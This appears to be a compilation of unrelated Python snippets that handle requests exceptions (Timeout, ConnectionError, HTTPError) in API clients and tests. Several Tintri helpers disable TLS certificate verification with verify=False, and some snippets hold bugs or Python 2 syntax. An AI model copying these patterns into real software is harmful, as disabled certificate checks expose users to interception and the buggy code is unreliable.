def test_location_google_breaks(self):
        """User passed location arg but google api gave error"""
        caught_exceptions = [
            requests.ConnectionError, requests.HTTPError, requests.Timeout]
        with mock.patch('requests.get') as mock_get:
            for exception in caught_exceptions:
                mock_get.side_effect = exception
                with capture_sys_output():
                    with self.assertRaises(RipeAtlasToolsException):
                        cmd = Command()
                        cmd.init_args(["--location", "blaaaa"])
                        cmd.run()
            mock_get.side_effect = Exception()
            with self.assertRaises(Exception):
                cmd = Command()
                cmd.init_args(["--location", "blaaaa"])
                cmd.run() 
**************************************
def test_raise_exception_if_api_returns_error_json_response(get_phab_client):
    phab = get_phab_client(api_key="api-key")
    error_json = {
        "result": None,
        "error_code": "ERR-CONDUIT-CORE",
        "error_info": "BOOM",
    }

    with requests_mock.mock() as m:
        # Test with the generic Timeout exception, which all other timeout
        # exceptions derive from.
        m.get(phab_url("conduit.ping"), status_code=500, json=error_json)

        with pytest.raises(PhabricatorAPIException):
            phab.call_conduit("conduit.ping")
        assert m.called 
**************************************
def api_delete(server_name, api, session_id):
    #Header and URL for delete call
    headers = {'content-type': 'application/json',
               'cookie': 'JSESSIONID='+session_id }

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.delete(url, headers=headers, verify=False)
    except requests.ConnectionError:
        raise TintrRequestsiApiException("API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except:
        raise TintriRequestsException("An unexpected error " + sys.exc_info()[0] + " occurred.")

    return r


# PUT 
**************************************
def api_put(server_name, api, payload, session_id):
    headers = {'content-type': 'application/json',
               'cookie': 'JSESSIONID='+session_id }

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.put(url, data=json.dumps(payload),
                         headers=headers, verify=False)
    except requests.ConnectionError:
        raise TintriRequestsException("API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except:
        raise TintriRequestsException("An unexpected error " + sys.exc_info()[0] + " occurred.")

    return r


# POST 
**************************************
def api_post(server_name, api, payload, session_id):
    headers = {'content-type': 'application/json',
               'cookie': 'JSESSIONID='+session_id }

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.post(url, data=json.dumps(payload),
                          headers=headers, verify=False)
    except requests.ConnectionError:
        raise TintriRequestsException("API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except:
        raise TintriRequestsException("An unexpected error " + sys.exc_info()[0] + " occurred.")

    return r


# Login. 
**************************************
def download_file(server_name, report_url, session_id, file_name):
    headers = {'content-type': 'application/json'}

    try:
        r = requests.get(report_url, headers=headers, verify=False, stream=True)
        # if HTTP Response is not 200 then raise an exception
        if r.status_code != 200:
            message = "The HTTP response for get call to the server is not 200."
            raise TintriApiException(message, r.status_code, report_url, "No Payload", r.text)

        with open(file_name, 'w') as file_h:
            for block in r.iter_content(4096):
                file_h.write(block)

    except requests.ConnectionError:
        raise TintriRequestsException("API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
        raise TintriRequestsException("Request timed out.")
    except Exception as e:
        raise TintriRequestsException("An unexpected error: " + e.__str__()) 
**************************************
def execute(self):
        try:
            response = Requester.request(self.method, self.url(), self.headers, self.params)
        except (requests.ConnectionError, requests.Timeout) as err:
            raise self.compose_error(err)

        if response.status_code == 401:
            text = response.text or "Authentication failed."
            raise AuthenticationError(text)
        elif response.status_code == 400:
            text = response.text or "Invalid request. Please check the URL and parameters."
            raise APIError(text)
        elif response.status_code == 404:
            text = response.text or "Invalid request. Please check the URL and parameters."
            raise APIError(text)
        elif response.status_code != 200:
            text = response.text or "An error occured while making the API call."
            raise APIError(text)

        try:
            return response.json()
        except ValueError:
            return APIError("Unable to parse the server response as JSON.") 
**************************************
def scrape_page_for_open_location(self, my_webpage):
        # logger.info(u"scraping", url)
        try:
            find_pdf_link = self.should_look_for_publisher_pdf()
            if not find_pdf_link:
                logger.info('skipping pdf search')

            my_webpage.scrape_for_fulltext_link(find_pdf_link=find_pdf_link)

            if my_webpage.error:
                self.error += my_webpage.error

            if my_webpage.is_open:
                my_open_location = my_webpage.mint_open_location()
                self.open_locations.append(my_open_location)
                # logger.info(u"found open version at", webpage.url)
            else:
                # logger.info(u"didn't find open version at", webpage.url)
                pass

        except requests.Timeout, e:
            self.error += "Timeout in scrape_page_for_open_location on {}: {}".format(
                my_webpage, unicode(e.message).encode("utf-8"))
            logger.info(self.error) 
**************************************
def sysprep(self):
        resource_location = "windows/sysprep.ps1"

        cmd = r"C:\{}".format(resource_location.split('/')[-1])
        self.download_resource(resource_location, cmd)
        LOG.debug("Running %s ", cmd)
        try:
            self._client.run_remote_cmd(
                cmd, command_type=util.POWERSHELL_SCRIPT_BYPASS,
                upper_timeout=CONFIG.argus.io_upper_timeout)
        except (socket.error, winrm_exceptions.WinRMTransportError,
                winrm_exceptions.InvalidCredentialsError,
                requests.ConnectionError, requests.Timeout):
            # After executing sysprep.ps1 the instance will reboot and
            # it is normal to have connectivity issues during that time.
            # Knowing these we have to except this kind of errors.
            # This fixes errors that stops scenarios from getting
            # created on different windows images.
            LOG.debug("Currently rebooting...")
        LOG.info("Wait for the machine to finish rebooting ...")
        self.wait_boot_completion() 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Notifications.json'
            r1=requests.get(Url,auth=(self.Sid,self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def FilterErrorCode(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Notifications.json?'
            params = {'ErrorCode': self.ErrorCode}
            r2 = requests.get(Url, params=params, auth=(self.Sid, self.AuthToken))

            if r2.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r2.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r2.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def FilterPage(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Notifications.json?'
            params = {'PageSize': self.ErrorCode}
            r3 = requests.get(Url, params=params, auth=(self.Sid, self.AuthToken))

            if r3.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Transcriptions.json'
            r1 = requests.get(Url , auth=(self.Sid, self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def FilterText(self):

        try:

            params = {'TranscriptionText':self.text}
            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Transcriptions.json?'
            r2 = requests.get(Url, params=params, auth=(self.Sid, self.AuthToken))

            if r2.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r2.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r2.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/IncomingPhoneNumbers.json'
            r1 = requests.get(Url, auth=(self.Sid, self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r1.text)
                return content
        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Attach(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/IncomingPhoneNumbers.json'
            data = {'PhoneNumber': self.phNumber, 'VoiceUrl': self.VoiceUrl, 'isSIP': 'true'}
            r2 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r2.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r2.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r2.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Delete(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/IncomingPhoneNumbers.json/'+self.CallSid
            r3 = requests.delete(Url, auth=(self.Sid, self.AuthToken))

            if r3.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url or Call Sid is Incorrect! Please verify and try again"
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Clients.json'
            r4 = requests.get(Url, auth=(self.Sid, self.AuthToken))

            if r4.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r4.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r4.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Recordings.json'
            r1 = requests.get(Url, auth=(self.Sid,self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def FilterCallSid(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Recordings.json?'
            params = {'CallSid':self.CallSid}

            r2 = requests.get(Url, params=params, auth=(self.Sid, self.AuthToken))

            if r2.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r2.status_code == 404:
                return "Base Url or Call Sid is Incorrect! Please verify and try again"
            else:
                content = json.loads(r2.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def FilterPage(self):

        try:

            PageInfo = self.CallSid
            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Recordings.json?'
            params = {'PageSize': PageInfo}
            r3 = requests.get(Url, params=params, auth=(self.Sid, self.AuthToken))

            if r3.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Details(self):

        try:

            Url=self.BaseUrl+'/Accounts.json/'+self.Sid
            r1=requests.get(Url, auth=(self.Sid,self.AuthToken))

            if r1.status_code == 401:
                return "Authentication Error! Please Enter Valid Account Sid and Authentication Token"
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r1.text)
                print(content)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Close(self):

        try:

            Url = self.BaseUrl+'/Accounts.json/'+self.SubSid
            data = {'Status': 'closed'}
            r3 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r3.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url is Incorrect or Invalid SubSid! Please verify and try again"
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Management/Gateways.json'
            r2 = requests.get(Url,auth=(self.Sid,self.AuthToken))

            if r2.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r2.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r2.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Update(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Management/Gateways.json/'+self.GatewaySid
            data = {'FriendlyName':self.FriendlyName,'UserName':self.UserName}
            r3 = requests.post(Url,data=data,auth=(self.Sid,self.AuthToken))

            if r3.status_code == 401:
                print("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url or Gateway Sid is Incorrect! Please verify and try again"
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            print("HTTP ERROR")
        except requests.ConnectionError:
            print("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            print("TIMEOUT ERROR")
        except requests.RequestException:
            print("Invalid Url! Please check and try again") 
**************************************
def Delete(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Management/Gateways.json/'+self.GatewaySid
            r4 = requests.delete(Url, auth=(self.Sid,self.AuthToken))

            if r4.status_code == 401:
                print("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r4.status_code == 404:
                return "Base Url or Gateway Sid is Incorrect! Please verify and try again"
            else:
                content = json.loads(r4.text)
                return content

        except requests.HTTPError:
            print("HTTP ERROR")
        except requests.ConnectionError:
            print("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            print("TIMEOUT ERROR")
        except requests.RequestException:
            print("Invalid Url! Please check and try again") 
**************************************
def Update(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Applications.json/' + self.AppSid
            data = {'FriendlyName': self.FriendlyName}
            r3 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r3.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url or Application Sid is Incorrect! Please verify and try again"
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Applications.json/'
            r4 = requests.get(Url, auth = (self.Sid, self.AuthToken))

            if r4.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r4.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r4.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetDetails(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Calls.json'
            r2 = requests.get(Url, auth=(self.Sid, self.AuthToken))

            if r2.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r2.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r2.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Redirect(self):

        try:

            data = {'Url': self.Url}
            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Calls.json/'+self.SubSid
            r3 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))

            if r3.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r3.status_code == 404:
                return "Base Url or Sub Sid is Incorrect! Please verify and try again"
            else:
                content = json.loads(r3.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def Mute(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Conferences.json/' + self.ConferenceSid + '/Participants.json/' + self.ParticipantSid
            data = {'Mute': 'true'}

            r5 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))
            if r5.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r5.status_code == 404:
                return "Base Url/Participant Sid/Conference Sid is Incorrect! Please verify and try again"
            else:
                content = json.loads(r5.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def UnMute(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/Conferences.json/' + self.ConferenceSid + '/Participants.json/' + self.ParticipantSid
            data = {'Mute': 'false'}

            r6 = requests.post(Url, data=data, auth=(self.Sid, self.AuthToken))
            if r6.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r6.status_code == 404:
                return "Base Url/Participant Sid/Conference Sid is Incorrect! Please verify and try again"
            else:
                content = json.loads(r6.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/'+self.Sid+'/Usage/Records/Daily.json'
            r1 = requests.get(Url, auth=(self.Sid, self.AuthToken))

            if r1.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r1.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r1.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def GetList(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/SMS/Messages.json'
            r2 = requests.get(Url, auth=(self.Sid, self.AuthToken))

            if r2.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r2.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r2.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def PageInfo(self):

        try:

            Url = self.BaseUrl+'/Accounts/' + self.Sid + '/SMS/Messages.json'
            params = {'PageSize': self.PageSize}
            r4 = requests.get(Url, params=params, auth=(self.Sid, self.AuthToken))

            if r4.status_code == 401:
                return ("Authentication Error! Please Enter Valid Account Sid and Authentication Token")
            elif r4.status_code == 404:
                return "Base Url is Incorrect! Please verify and try again"
            else:
                content = json.loads(r4.text)
                return content

        except requests.HTTPError:
            return ("HTTP ERROR")
        except requests.ConnectionError:
            return ("CONNECTION ERROR! Please check and try again")
        except requests.Timeout:
            return ("TIMEOUT ERROR")
        except requests.RequestException:
            return ("Invalid Url! Please check and try again") 
**************************************
def test_connectivity(self):
        try:
            resp = self.get('version/')
        except requests.Timeout:
            raise errors.TransientDriverError("Timeout connection to MaaS")

        if resp.status_code in [500, 503]:
            raise errors.TransientDriverError("Received 50x error from MaaS")

        if resp.status_code != 200:
            raise errors.PersistentDriverError(
                "Received unexpected error from MaaS")

        return True 
**************************************
def download_file(self, report_url, file_name):
        """
        Downloads the file pointed by URL.

        Args:
        
            report_url (str): URL returned from API from which file can be downloaded
            file_name (str): Name to be used for downloaded file 
        """
        headers = {'content-type': 'application/json'}
    
        try:
            r = requests.get(report_url, headers=headers, verify=False, stream=True)
            if r.status_code != 200:
                message = "The HTTP response for get call on: %s is %s" % (report_url, r.status_code)
                raise TintriServerError(r.status_code, message=message)
    
            with open(file_name, 'w') as file_h:
                for block in r.iter_content(4096):
                    file_h.write(block)

        except TintriServerError:
            raise    
        except requests.ConnectionError:
            raise TintriError("API Connection error occurred.")
        except requests.HTTPError:
            raise TintriError("HTTP error occurred.")
        except requests.Timeout:
            raise TintriError("Request timed out.")
        except Exception as e:
            raise TintriError("An unexpected error occurred: " + e.__str__()) 
**************************************
def is_working_url(self, url):
        try:
            response = requests.head(url,
                                     timeout=self.url_check_timeout,
                                     verify=self.verify_ssl)
            matches = []
            if response.status_code not in EXCEPTION_STATUS_CODES:
                matches = \
                    [re.match(pattern, str(response.status_code)) is not None
                     for pattern in INVALID_STATUS_CODES_REGEX]
            return True not in matches, response.status_code
        except Timeout:
            return False, 408
        except (RequestException, Exception):
            return False, None 
**************************************
def test_is_working_url_url_with_timeout(self, req_mock):
        url_validator = UrlValidator(self.catalog, True, 1, 10)
        req_mock.head(self.test_url, exc=Timeout)
        self.assertEqual(
            (False, 408), url_validator.is_working_url(self.test_url)) 
**************************************
def test_throws_exception(self):
        self.requests_mock.head(requests_mock.ANY, exc=Timeout)
        assert_false(self.dj.is_valid_catalog(broken_links=True)) 
**************************************
def location2degrees(self):
        """Fetches degrees based on the given location."""
        error_log = (
            "Following error occured while trying to fetch lat/lon"
            "for location <{}>:\n{}"
        )
        goole_api_url = "http://maps.googleapis.com/maps/api/geocode/json"
        try:
            result = requests.get(goole_api_url, params={
                "sensor": "false",
                "address": self.arguments.location
            })
        except (
            requests.ConnectionError,
            requests.HTTPError,
            requests.Timeout,
        ) as e:
            error_log = error_log.format(self.arguments.location, e)
            raise RipeAtlasToolsException(error_log)

        result = result.json()

        try:
            lat = result["results"][0]["geometry"]["location"]["lat"]
            lng = result["results"][0]["geometry"]["location"]["lng"]
        except (KeyError, IndexError) as e:
            error = error_log.format(self.arguments.location, e)
            raise RipeAtlasToolsException(error)

        return str(lat), str(lng) 
**************************************
def test_raise_exception_if_api_ping_times_out(get_phab_client):
    phab = get_phab_client(api_key="api-key")
    with requests_mock.mock() as m:
        # Test with the generic Timeout exception, which all other timeout
        # exceptions derive from.
        m.get(phab_url("conduit.ping"), exc=requests.Timeout)

        with pytest.raises(PhabricatorAPIException):
            phab.call_conduit("conduit.ping")
        assert m.called 
**************************************
def _get_requests(self, url):
        out = self.empty_json
        try:
            r = requests.get(url, headers=self.headers,
                             auth=(self.username, self.password),
                             timeout=self.timeout, stream=True)
            s = ""
            for chunk in r.iter_content(1024):
                if chunk:
                    s += chunk
            out = json.loads(s)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        
        return r.status_code, "OK", out 
**************************************
def _post_requests(self, url, data=""):
        out = self.empty_json
        if isinstance(data, dict):
            data = json.dumps(data)
        elif data:
            try:
                data = json.loads(data)
            except ValueError:
                print "Input not a valid JSON document"
                return 400, "Input not a valid JSON document", out
        try:
            r = requests.post(url, data=data, headers=self.headers,
                             auth=(self.username, self.password),
                             timeout=self.timeout)
        except requests.Timeout as e:
            print "Timeout for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "Timeout for url %s: %s" % (url,e,), out
        except requests.ConnectionError as e:
            print "ConnectionError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "ConnectionError for url %s: %s" % (url,e,), out
        except requests.HTTPError as e:
            print "HTTPError for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "HTTPError for url %s: %s" % (url,e,), out
        except requests.RequestException as e:
            print "RequestException for URL %s: %s" % (url,e,)
            print "Headers: %s" % (str(self.headers),)
            return 400, "RequestException for url %s: %s" % (url,e,), out
        return r.status_code, "OK", r.json() 
**************************************
def get_oncall():
    """Make an API request to PagerDuty to fetch the current oncall person.
       Just updates the in-memory data structure.
    """
    global oncall
    headers = {
        'Authorization': 'Token token={0}'.format(cfg["pagerduty_api_token"]),
        'Content-Type': 'application/vnd.pagerduty+json;version=2',
    }
    url = 'https://api.pagerduty.com/oncalls?time_zone=UTC&include%5B%5D=users&escalation_policy_ids%5B%5D={0}&schedule_ids%5B%5D={1}'.format(cfg["pagerduty_escalation_policy"],cfg["pagerduty_oncall_schedule"])
    try:
        r = requests.get(url, headers=headers, timeout=30)
        decoded = json.loads(r.text)
        oncall = decoded["oncalls"][0]["user"]
        oncall["start"] = decoded["oncalls"][0]["start"]
        oncall["end"] = decoded["oncalls"][0]["end"]
        # parse text of "description" field ("Bio" in the UI) to get IRC
        # and Slack if present, but fall back to first part of email if not given
        oncall["irc_nick"] = oncall["email"].split("@")[0]
        oncall["slack_nick"] = oncall["email"].split("@")[0]
        # check for an IRC nick in the Bio field
        if oncall["description"]:
            match = re.search(':(\S+)', oncall["description"])
            if match:
                oncall["irc_nick"] = match.group(1)
            # check for a Slack nick in the Bio field
            match = re.search('@(.+) on Slack', oncall["description"])
            if match:
                oncall["slack_nick"] = match.group(1)
    except requests.Timeout:
        print("PagerDuty API timed out!")
        pass
    except requests.exceptions.ConnectionError as e:
        print("PagerDuty API failed to connect: %s" % e)
        pass
    except Exception as e:
        print("Got an error looking up the oncall in PagerDuty: %s" % e)
        raise
    return 
**************************************
def api_get_query(server_name, api, query, session_id):
    headers = {'content-type': 'application/json'}
    if session_id is not None:
        headers['cookie'] = 'JSESSIONID=' + session_id

    url = 'https://' + server_name + API + api

    try:
        # Invoke the API.
        r = requests.get(url, headers=headers, params=query, verify=False)
    except requests.ConnectionError:
        raise TintriRequestsException("GET: API Connection error occurred.")
    except requests.HTTPError:
        raise TintriRequestsException("HTTP error occurred.")
    except requests.Timeout:
